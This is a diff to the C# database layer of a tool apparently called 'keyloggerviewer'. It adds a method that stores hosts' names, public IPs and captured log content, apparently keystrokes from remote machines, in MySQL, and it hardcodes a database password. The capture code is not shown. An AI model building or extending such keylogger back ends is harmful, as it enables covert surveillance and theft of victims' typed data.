@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Data;
+using System.Linq;
 using System.Windows.Forms;
 using Microsoft.VisualBasic;
 using MySql.Data.MySqlClient;
@@ -17,16 +18,17 @@ namespace keyloggerviewer
             string connStr = "server=localhost;user=keylogger;database=keylogger;port=3306;password=keylogger";
             this.connection = new MySqlConnection(connStr);
         }
-        
-        public List<LogData> simpleGet(string hostName="", string hostPublicIp="", string hostPrivateIp="",
-            string type="", int contentMaxLen=1000, int contentMinLen=0, string regex="", int lineBefore=0, 
-            int lineAfter=0, string startDate="", string endDate="", string startTime="", string endTime="")
+
+        public List<LogData> simpleGet(string hostName = "", string hostPublicIp = "", string hostPrivateIp = "",
+            string type = "", int contentMaxLen = 1000, int contentMinLen = 0, string regex = "", int lineBefore = 0,
+            int lineAfter = 0, string startDate = "", string endDate = "", string startTime = "", string endTime = "")
         {
             List<LogData> logList = new List<LogData>();
             if (connection.State != ConnectionState.Open)
             {
                 connection.Open();
             }
+
             string sqlReq = @"SELECT l.hostId, l.logId 
             FROM host as h JOIN log as l ON h.hostId = l.hostId
             WHERE (@hostname = '' OR h.hostName = @hostname) 
@@ -56,16 +58,18 @@ namespace keyloggerviewer
             List<int[]> idCombo = new List<int[]>();
             while (rdr.Read())
             {
-                Console.WriteLine(rdr[0]+" -- "+rdr[1]);
+                Console.WriteLine(rdr[0] + " -- " + rdr[1]);
                 int[] a = {int.Parse(rdr[0].ToString()), int.Parse(rdr[1].ToString())};
                 idCombo.Add(a);
             }
+
             rdr.Close();
             foreach (int[] i in idCombo)
             {
                 Console.WriteLine(i[0]);
                 Console.WriteLine(i[1]);
-                sqlReq = @"SELECT h.hostName, h.hostPublicIp, h.hostPrivateIp, TIMESTAMP(l.logDate, l.logTime), l.logType, l.content, l.logId
+                sqlReq =
+                    @"SELECT h.hostName, h.hostPublicIp, h.hostPrivateIp, TIMESTAMP(l.logDate, l.logTime), l.logType, l.content, l.logId
                             FROM host as h JOIN log as l ON h.hostId = l.hostId
                             WHERE (l.logId <= @maxLog) AND (l.logId >= @minLog) AND (l.hostId=@hostId)";
                 req = new MySqlCommand(sqlReq, connection);
@@ -77,15 +81,18 @@ namespace keyloggerviewer
                 {
                     Console.WriteLine(rdr2[0] + " -- " + rdr2[1] + " -- " + rdr2[2] + " -- " + rdr2[3] + " -- " +
                                       rdr2[4] + " -- " + rdr2[5] + " -- " + rdr2[6]);
-                    logList.Add(new LogData(rdr2[0].ToString(), rdr2[1].ToString(), rdr2[2].ToString(), DateTime.Parse(rdr2[3].ToString()),rdr2[4].ToString(),rdr2[5].ToString(), int.Parse(rdr2[6].ToString())));
-                    
+                    logList.Add(new LogData(rdr2[0].ToString(), rdr2[1].ToString(), rdr2[2].ToString(),
+                        DateTime.Parse(rdr2[3].ToString()), rdr2[4].ToString(), rdr2[5].ToString(),
+                        int.Parse(rdr2[6].ToString())));
+
                 }
+
                 rdr2.Close();
             }
-                
+
             connection.Close();
             Console.WriteLine("OK");
-            
+
             return logList;
         }
 
@@ -102,11 +109,110 @@ namespace keyloggerviewer
             List<string> names = new List<string>();
             while (rdr.Read())
             {
-                names.Add(rdr[0].ToString());              
+                names.Add(rdr[0].ToString());
             }
+
             rdr.Close();
             return names;
         }
 
+        public int insertLogData(Host h)
+        {
+            if (connection.State != ConnectionState.Open)
+            {
+                connection.Open();
+            }
+
+            string sqlReq = @"SELECT hostId FROM host WHERE hostName = @hostName AND hostPublicIp = @publicIp";
+            MySqlCommand req = new MySqlCommand(sqlReq, connection);
+            req.Parameters.AddWithValue("@hostName", h.HostName);
+            req.Parameters.AddWithValue("@publicIp", h.PublicIp);
+            MySqlDataReader rdr = req.ExecuteReader();
+            if (rdr.HasRows)
+            {
+                Console.WriteLine("coucou");
+                int id = 0;
+                while (rdr.Read())
+                {
+                    id = int.Parse(rdr[0].ToString());
+                }
+
+                rdr.Close();
+                h.SqlId = id;
+            }
+            else
+            {
+                rdr.Close();
+                Console.WriteLine("create");
+                sqlReq = @"INSERT INTO `host` (`hostName`, `hostPublicIp`) VALUES (@hostName, @publicIp);";
+                req = new MySqlCommand(sqlReq, connection);
+                req.Parameters.AddWithValue("@hostName", h.HostName);
+                req.Parameters.AddWithValue("@publicIp", h.PublicIp);
+                Console.WriteLine("TTOTOO");
+                int c = req.ExecuteNonQuery();
+                Console.WriteLine("aze");
+                Console.WriteLine(c);
+                sqlReq = @"SELECT hostId FROM host WHERE hostName = @hostName AND hostPublicIp = @publicIp";
+                req = new MySqlCommand(sqlReq, connection);
+                req.Parameters.AddWithValue("@hostName", h.HostName);
+                req.Parameters.AddWithValue("@publicIp", h.PublicIp);
+                rdr = req.ExecuteReader();
+                int id = 0;
+                while (rdr.Read())
+                {
+                    id = int.Parse(rdr[0].ToString());
+                }
+
+                rdr.Close();
+                h.SqlId = id;
+            }
+
+            sqlReq =
+                @"SELECT logId, TIMESTAMP(logDate, logTime) FROM log WHERE hostId = @hostId AND logId = (SELECT MAX(logId) FROM log WHERE hostId = @hostId);";
+            req = new MySqlCommand(sqlReq, connection);
+            req.Parameters.AddWithValue("@hostId", h.SqlId);
+            rdr = req.ExecuteReader();
+            int lastId = 0;
+            DateTime lastTime = DateTime.Parse("1/1/1900");
+            if (rdr.HasRows)
+            {
+
+                while (rdr.Read())
+                {
+                    lastId = int.Parse(rdr[0].ToString());
+                    lastTime = DateTime.Parse(rdr[1].ToString());
+                }
+            }
+            rdr.Close();
+            h.LogList = h.LogList.Where(x => x.LogDate > lastTime).ToList();
+            foreach (Log log in h.LogList)
+            {
+                lastId += 1;
+                log.LogId = lastId;
+            }
+
+            sqlReq =
+                "INSERT INTO log (hostId, logId, logType, logDate, logTime, content) VALUES (@hostId, @logId, @logType, @logDate, @logTime, @content)";
+            req = new MySqlCommand(sqlReq, connection);
+            req.Parameters.Add("@hostId", MySqlDbType.Int32);
+            req.Parameters.Add("@logId", MySqlDbType.Int32);
+            req.Parameters.Add("@logType", MySqlDbType.String);
+            req.Parameters.Add("@logDate", MySqlDbType.DateTime);
+            req.Parameters.Add("@logTime", MySqlDbType.DateTime);
+            req.Parameters.Add("@content", MySqlDbType.String);
+            foreach (Log log in h.LogList)
+            {
+                req.Parameters["@hostId"].Value = log.HostId;
+                req.Parameters["@logId"].Value = log.LogId;
+                req.Parameters["@logType"].Value = log.LogType;
+                req.Parameters["@logDate"].Value = log.LogDate;
+                req.Parameters["@logTime"].Value = log.LogTime;
+                req.Parameters["@content"].Value = log.LogContent;
+                req.ExecuteNonQuery();
+            }
+            
+            Console.WriteLine("qsd");
+            return 1;
+        }
     }
 }
